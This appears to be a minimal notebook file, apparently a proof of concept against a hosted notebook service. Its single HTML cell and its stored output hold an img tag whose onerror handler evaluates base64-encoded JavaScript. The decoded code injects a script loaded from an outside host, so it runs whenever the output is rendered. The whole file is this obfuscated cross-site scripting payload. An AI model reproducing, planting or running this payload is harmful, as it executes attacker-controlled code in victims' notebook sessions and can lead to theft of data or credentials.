# %%
# %%html
# <img src=x onerror="eval(atob('...'))">
# Out:
# <img src=x onerror="eval(atob('d2l0aChkb2N1bWVudC5ib2R5LmFwcGVuZENoaWxkKGNyZWF0ZUVsZW1lbnQoJ3NjcmlwdCcpKSkuc3JjPSdodHRwczovL3BvYy5oZWxpOS5jb20vZW1yL2Vtcl9yY2UuanMn'))">
